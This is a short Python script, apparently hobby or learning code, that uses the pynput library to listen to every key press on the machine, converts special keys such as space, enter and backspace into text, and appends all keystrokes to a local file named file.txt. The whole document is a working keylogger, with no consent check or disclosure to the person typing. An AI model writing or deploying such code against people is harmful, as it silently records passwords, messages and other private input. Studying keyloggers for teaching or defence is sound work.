from pynput.keyboard import Listener 

def write_file(key):
    #key is not an str so we must cast it 
    key = str(key)
    #the key is captured but as 'letter' so we gotta ramove the " ' "
    key = key.replace("'","")


    #if the user presses any special caracterr it must appear as it is
    special_keys = {
        "Key.space": " ",
        "Key.enter": "\n",
        "Key.tab": "\t",
        "Key.shift": "",       
        "Key.shift_r": "",
        "Key.ctrl_l": "",
        "Key.ctrl_r": "",
        "Key.alt_l": "",
        "Key.alt_r": "",
        "Key.backspace": "[BACKSPACE]",
        "Key.caps_lock": "[CAPSLOCK]",
    }

    if key in special_keys:
        key = special_keys[key]

        

    #opening the file and then writing in it 
    with open("file.txt","a") as file:
        file.write(key)
    file.close()






with Listener(on_press = write_file) as l :
    l.join()